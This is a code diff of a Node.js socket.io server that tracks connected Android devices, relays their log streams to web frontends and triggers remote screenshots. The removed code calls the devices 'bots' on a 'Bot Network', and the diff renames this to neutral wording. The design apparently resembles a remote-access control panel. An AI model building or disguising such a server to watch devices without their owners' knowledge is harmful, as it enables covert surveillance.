@@ -8,12 +8,10 @@ import path from 'path';
 import { db } from './db.js';
 import { promises as fs } from "fs";
 
-// Variables
-const portBots = 4000
-const portMaster = 4001
-let adminSockets = []; // Array de todas las conexiones frontend activas
+const androidPort = 4000
+const frontendPort = 4001
 let devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
-// Variables
+let pendingScreenshots = new Map(); // Map<device_uuid, frontend_socket_id>
 
 // Express
 const app = express()
@@ -27,16 +25,16 @@ app.get('/', (req, res) => {
     res.sendFile(path.resolve('./static/html/index.html'));
 });
 
-const masterServer = app.listen(portMaster, "0.0.0.0", () => {
-    console.log(`Master Network listening on http://0.0.0.0:${portMaster}/`)
+const frontendServer = app.listen(frontendPort, "0.0.0.0", () => {
+    console.log(`Listening for frontends on http://0.0.0.0:${frontendPort}/`)
     // DB initialized on import
 })
 
-// Socket io Connection for BOTS
-const botIo = new Server(portBots)
-console.log(`Bot Network listening on http://0.0.0.0:${portBots}/`)
+// Socket io Connection for Android devices
+const androidIo = new Server(androidPort)
+console.log(`Listening for android devices on http://0.0.0.0:${androidPort}/`)
 
-botIo.on("connection", async (socket) => {
+androidIo.on("connection", async (socket) => {
     try {
         const dataStr = socket.handshake.query.info;
         if (!dataStr) {
@@ -78,8 +76,7 @@ botIo.on("connection", async (socket) => {
             deviceUuid, data.Brand, data.Model, data.Manufacturer, Date.now(), Date.now()
         ).catch(console.error);
 
-        console.log(chalk.green(`[+] Bot Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
-        console.log(chalk.blue(`[i] Device ${deviceUuid} status updated to: connected = ${device.connected}`))
+        console.log(chalk.green(`[+] Android device Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
 
         const deviceList = Array.from(devices.values()).map((d) => ({
             ...d.info,
@@ -87,8 +84,8 @@ botIo.on("connection", async (socket) => {
             connected: d.connected
         })).slice(0, 20);
 
-        masterIo.emit("info", deviceList);
-        console.log(chalk.blue(`[i] Status broadcast sent to ${adminSockets.length} frontend(s) (${deviceList.filter(d => d.connected).length} connected devices)`));
+        frontendIo.emit("info", deviceList);
+        console.log(chalk.blue(`[i] Status broadcast sent to frontend(s) connected devices)`));
 
         socket.on("disconnect", async () => {
             const deviceUuid = socket.deviceUuid;
@@ -102,13 +99,13 @@ botIo.on("connection", async (socket) => {
                 // Update last_seen in DB
                 await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid).catch(console.error);
 
-                console.log(chalk.redBright(`[x] Bot Disconnected (${deviceUuid})`))
+                console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid})`))
                 const deviceList = Array.from(devices.values()).map((d) => ({
                     ...d.info,
                     ID: d.info.device_uuid,
                     connected: d.connected
                 })).slice(0, 20);
-                masterIo.emit("info", deviceList);
+                frontendIo.emit("info", deviceList);
             }
         })
 
@@ -120,7 +117,7 @@ botIo.on("connection", async (socket) => {
             try {
                 // console.log(`Logger from device ${deviceUuid}: ${data}`);
                 device.logs.push({ timestamp: Date.now(), log: data });
-                masterIo.emit("logger", { device: deviceUuid, log: data });
+                frontendIo.emit("logger", { device: deviceUuid, log: data });
 
                 // Incremental storage: Append to daily logs
                 const today = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
@@ -144,7 +141,7 @@ botIo.on("connection", async (socket) => {
 
         socket.on("screenshot_response", async (data) => {
             const deviceUuid = socket.deviceUuid;
-            if (!deviceUuid || adminSockets.length === 0) return;
+            if (!deviceUuid) return;
             try {
                 if (!Buffer.isBuffer(data) && !(data instanceof ArrayBuffer)) {
                     throw new Error('Invalid image data: not a buffer');
@@ -162,15 +159,24 @@ botIo.on("connection", async (socket) => {
                 await fs.mkdir('screenshots', { recursive: true });
                 await fs.writeFile(filepath, buffer);
 
-                masterIo.emit("screenshot_ready", {
-                    device_uuid: deviceUuid,
-                    filename: filename
-                });
+                // Emit only to the specific frontend that requested the screenshot
+                const requestingFrontendId = pendingScreenshots.get(deviceUuid);
+                if (requestingFrontendId) {
+                    const requestingSocket = frontendIo.sockets.sockets.get(requestingFrontendId);
+                    if (requestingSocket) {
+                        requestingSocket.emit("screenshot_ready", {
+                            device_uuid: deviceUuid,
+                            filename: filename
+                        });
+                    }
+                    // Clean up the pending request
+                    pendingScreenshots.delete(deviceUuid);
+                }
 
                 console.log(`Screenshot saved: screenshots/${filename}`);
             } catch (err) {
                 console.error('Screenshot response error:', err);
-                masterIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
+                frontendIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
             }
         })
     } catch (error) {
@@ -179,34 +185,17 @@ botIo.on("connection", async (socket) => {
     }
 })
 
-// Socket io Connection for Master (Frontend)
-const masterIo = new Server(masterServer);
-masterIo.on("connection", (socket) => {
-    console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id}) - Total: ${adminSockets.length + 1}`))
-    adminSockets.push(socket);
+// Socket io Connection for Frontends
+const frontendIo = new Server(frontendServer);
+frontendIo.on("connection", (socket) => {
+    console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id})`))
 
-    // Enviar lista actual a la nueva conexión
     const deviceList = Array.from(devices.values()).map((d) => ({
         ...d.info,
         ID: d.info.device_uuid,
         connected: d.connected
     })).slice(0, 20);
     socket.emit("info", deviceList);
-
-    // Forzar actualización después de 1 segundo (para sincronizar reconexiones)
-    setTimeout(() => {
-        const currentDeviceList = Array.from(devices.values()).map((d) => ({
-            ...d.info,
-            ID: d.info.device_uuid,
-            connected: d.connected
-        })).slice(0, 20);
-
-        const hasConnectedDevices = currentDeviceList.some(d => d.connected === true);
-        if (hasConnectedDevices) {
-            console.log(chalk.blue(`[i] Frontend ${socket.id} - forcing device status update`));
-            socket.emit("info", currentDeviceList);
-        }
-    }, 1000);
 
     socket.on("get_device_logs", (id) => {
         const device = devices.get(id);
@@ -221,6 +210,8 @@ masterIo.on("connection", (socket) => {
         console.log(`Relaying screenshot request to device: ${deviceId}`);
         const device = devices.get(deviceId);
         if (device && device.socket) {
+            // Store the mapping between device UUID and frontend socket ID
+            pendingScreenshots.set(deviceId, socket.id);
             device.socket.emit("screenshot");
             console.log(chalk.green(`Screenshot request sent to app.`))
         } else {
@@ -261,7 +252,13 @@ masterIo.on("connection", (socket) => {
     });
 
     socket.on("disconnect", () => {
-        adminSockets = adminSockets.filter(s => s.id !== socket.id);
-        console.log(chalk.red(`[x] Frontend Disconnected (${socket.id}) - Remaining: ${adminSockets.length}`))
+        console.log(chalk.red(`[x] Frontend Disconnected (${socket.id})`))
+
+        // Clean up any pending screenshot requests for this frontend
+        for (const [deviceId, frontendId] of pendingScreenshots.entries()) {
+            if (frontendId === socket.id) {
+                pendingScreenshots.delete(deviceId);
+            }
+        }
     });
 })
